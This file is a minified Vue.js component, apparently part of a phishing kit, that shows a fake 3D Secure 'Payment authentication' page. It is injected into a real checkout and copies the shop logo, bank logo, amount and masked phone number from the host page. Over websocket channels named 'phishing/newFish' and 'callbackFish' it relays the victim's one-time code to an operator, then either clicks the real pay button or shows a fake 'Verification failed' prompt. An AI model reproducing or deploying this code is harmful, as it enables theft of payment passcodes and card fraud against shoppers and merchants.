import{f as E,g as T,r as d,h as j,i as q,j as L,s as p,k as N,l as D,c as u,o as r,a as t,m as H,n as x,p as y,q as w,v as F,t as k,b as g,w as v,x as I,T as S,y as V,z,d as U,A as R,_ as O}from"./CRCXkJG4.js";const P={class:"min-h-screen bg-gray-50 flex items-center justify-center p-4"},Y={class:"w-full max-w-[750px] bg-white rounded-lg shadow-lg overflow-hidden"},$={class:"p-4 sm:p-6"},A={class:"space-y-6"},G={class:"space-y-3 pt-2"},J=["disabled"],X=["disabled"],W={class:"pt-4 border-t border-gray-200"},Z={key:0,xmlns:"http://www.w3.org/2000/svg",width:"16",height:"16",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor","stroke-width":"2","stroke-linecap":"round","stroke-linejoin":"round",class:"h-3 w-3 sm:h-4 sm:w-4 text-gray-400 transition-transform"},K={key:1,xmlns:"http://www.w3.org/2000/svg",width:"16",height:"16",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor","stroke-width":"2","stroke-linecap":"round","stroke-linejoin":"round",class:"h-3 w-3 sm:h-4 sm:w-4 text-gray-400 transition-transform"},Q={class:"overflow-hidden"},ee={class:"bg-white rounded-lg shadow-xl p-6 w-full max-w-md transform transition-all"},te={class:"flex flex-col items-center text-center space-y-4"},se={class:"w-full pt-2"},oe="websocket/addons/phishing/newFish",_="websocket/addons/phishing/editFish",ae="websocket/addons/phishing/callbackFish",ne=E({__name:"fish",setup(ie){const l=T(),a=d(!1),c=d(!1),n=d(0),s=d({}),i=d(!1);j(n,o=>{o>0&&setTimeout(()=>{n.value--},1e3)});const M=async()=>{C(),a.value=!0,l.loadStripe()};function C(){s.code!=""&&(s.value.status="checking",p(_,{message:s.value}))}const f=o=>{if(o.data.action=="send")l.unloadStripe();else if(o.data.action=="pass"){a.value=!1,console.log("======真实提交");const e=top.document.getElementById("checkout-pay-button");e.disabled=!1,e.click(),top.window.hack=!1}else(o.data.action=="reject"||o.data.action=="decline")&&(a.value=!1,s.value.code="",i.value=!0,l.unloadStripe());console.log("callBackFish：",o)},B=()=>{s.value.status="resend",s.value.code="",p(_,{message:s.value}),n.value=60,i.value=!1},b=()=>{i.value=!1};return q(async()=>{L(ae,f);const o=Object.fromEntries(new URLSearchParams(window.location.search));if(window.self!==window.top){const e=top.document.querySelector("#basic-creditCards-secondary img").src;document.querySelector("#bankLogo").setAttribute("src",e);const m=top.document.querySelector("a img").src;document.querySelector("#shopLogo").setAttribute("src",m),document.querySelector("#i-money").innerHTML=top.document.querySelector("strong:nth-child(2)").innerHTML,document.querySelector("#i-bank").innerHTML=top.document.querySelector("a img").alt,document.querySelector("#i-date").innerHTML=new Date().toLocaleDateString("en-US",{day:"2-digit",month:"2-digit",year:"2-digit"}),document.querySelector("#i-phone").innerHTML=o.fpPhone.slice(-4).padStart(4,"*")}o.status="ready",console.log(o),s.value=o,p(oe,{message:s.value})}),N(()=>{D(f)}),(o,e)=>{const m=z;return r(),u("div",P,[t("div",Y,[e[8]||(e[8]=x('<div class="bg-white border-b border-gray-200 p-4 sm:p-6" data-v-3150cdb0><div class="flex items-center justify-between" data-v-3150cdb0><div class="flex items-center gap-2 sm:gap-3" data-v-3150cdb0><img id="shopLogo" src="https://images.unsplash.com/photo-1606429437134-9d975fcc508f?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=M3w3Nzg4Nzd8MHwxfHNlYXJjaHwxfHxzdHJpcGUlMjBwYXR0ZXJufGVufDF8fHx8MTc2NDU2MDI5N3ww&amp;ixlib=rb-4.1.0&amp;q=80&amp;w=1080&amp;utm_source=figma&amp;utm_medium=referral" alt="Stripe Pattern" class="h-10 sm:h-12 w-auto rounded" data-v-3150cdb0></div><div class="flex items-center" data-v-3150cdb0><img id="bankLogo" src="http://tentree.com/cdn/shopifycloud/checkout-web/assets/c1/assets/amex.Csr7hRoy.svg" alt="Mastercard ID Check" class="h-10 sm:h-12 w-auto rounded" data-v-3150cdb0></div></div></div>',1)),t("div",$,[t("div",A,[e[7]||(e[7]=x('<div data-v-3150cdb0><h2 class="mb-4 text-gray-900" data-v-3150cdb0>Payment authentication</h2><div class="bg-gray-50 border border-gray-200 rounded-lg p-4 mb-4" data-v-3150cdb0><div class="text-sm text-gray-600 mb-2" data-v-3150cdb0>You are authorizing a payment of</div><div id="i-money" class="text-2xl sm:text-3xl font-semibold text-gray-900 mb-2" data-v-3150cdb0>$99.00</div><div class="text-sm text-gray-600" data-v-3150cdb0> to <span id="i-bank" class="font-medium text-gray-900" data-v-3150cdb0>SecureBank</span> on <span id="i-date" class="font-medium" data-v-3150cdb0>27/02/24</span></div></div><p class="text-sm sm:text-base text-gray-600" data-v-3150cdb0> We have sent you a text message with a code to your registered mobile number ending in <span id="i-phone" class="font-medium" data-v-3150cdb0>**7878</span>. </p></div>',1)),t("form",{onSubmit:y(M,["prevent"]),class:"space-y-4"},[t("div",null,[e[2]||(e[2]=t("label",{for:"otp-code",class:"text-sm sm:text-base text-gray-700 mb-2 block"}," Enter authentication code ",-1)),w(t("input",{id:"otp-code","onUpdate:modelValue":e[0]||(e[0]=h=>s.value.code=h),type:"text",placeholder:"Enter code",maxlength:"8",class:"w-full h-12 sm:h-14 text-center text-base sm:text-base tracking-widest font-base border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-green-500 focus:border-transparent px-4",required:""},null,512),[[F,s.value.code]])]),t("div",G,[t("button",{type:"submit",disabled:s.value.code?.length!==6||a.value,class:"w-full h-12 sm:h-14 bg-green-600 hover:bg-green-700 text-white rounded-md disabled:opacity-50 disabled:cursor-not-allowed transition-colors font-normal"},k(a.value?"VERIFYING...":"SUBMIT"),9,J),t("button",{type:"button",onClick:B,disabled:n.value>0,class:"w-full h-12 sm:h-14 border border-gray-300 text-gray-700 hover:bg-gray-50 rounded-md disabled:opacity-50 disabled:cursor-not-allowed transition-colors font-normal bg-white"},k(n.value>0?`RESEND CODE (${n.value}s)`:"RESEND CODE"),9,X)])],32),t("div",W,[t("button",{onClick:e[1]||(e[1]=h=>c.value=!c.value),class:"flex items-center justify-between w-full py-2 text-left group"},[e[5]||(e[5]=t("span",{class:"text-xs sm:text-sm text-gray-600 group-hover:text-gray-800"}," Why am I seeing this? ",-1)),c.value?(r(),u("svg",Z,[...e[3]||(e[3]=[t("polyline",{points:"6 9 12 15 18 9"},null,-1)])])):(r(),u("svg",K,[...e[4]||(e[4]=[t("polyline",{points:"9 18 15 12 9 6"},null,-1)])]))]),g(S,{name:"expand"},{default:v(()=>[w(t("div",Q,[...e[6]||(e[6]=[t("div",{class:"pb-3 pt-1 text-xs sm:text-sm text-gray-500 leading-relaxed"},[t("p",null," 3D Secure authentication provides an additional layer of security for online transactions. This verification process helps protect your card from unauthorized use by requiring you to enter a one-time password sent to your registered mobile device. ")],-1)])],512),[[I,c.value]])]),_:1})])])])]),(r(),H(R,{to:"body"},[g(S,{name:"modal-fade"},{default:v(()=>[i.value?(r(),u("div",{key:0,class:"fixed inset-0 z-50 flex items-center justify-center p-4 bg-gray-900/40",onClick:y(b,["self"])},[t("div",ee,[t("div",te,[e[10]||(e[10]=t("div",{class:"flex-shrink-0 w-16 h-16 bg-red-100 rounded-full flex items-center justify-center"},[t("svg",{xmlns:"http://www.w3.org/2000/svg",width:"32",height:"32",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor","stroke-width":"2","stroke-linecap":"round","stroke-linejoin":"round",class:"text-red-600","aria-hidden":"true"},[t("circle",{cx:"12",cy:"12",r:"10"}),t("line",{x1:"12",y1:"8",x2:"12",y2:"12"}),t("line",{x1:"12",y1:"16",x2:"12.01",y2:"16"})])],-1)),e[11]||(e[11]=t("div",{class:"space-y-2"},[t("h3",{class:"text-lg sm:text-xl font-semibold text-gray-900"}," Verification failed "),t("p",{class:"text-sm sm:text-base text-gray-600 max-w-sm"}," The code you entered is incorrect. Please check your message and try again, or request a new code. ")],-1)),t("div",se,[g(m,{color:"green",size:"lg",block:"",onClick:b,class:"h-12 sm:h-14"},{default:v(()=>[...e[9]||(e[9]=[U(" Try again ",-1)])]),_:1})])])])])):V("",!0)]),_:1})]))])}}}),re=O(ne,[["__scopeId","data-v-3150cdb0"]]);export{re as default};
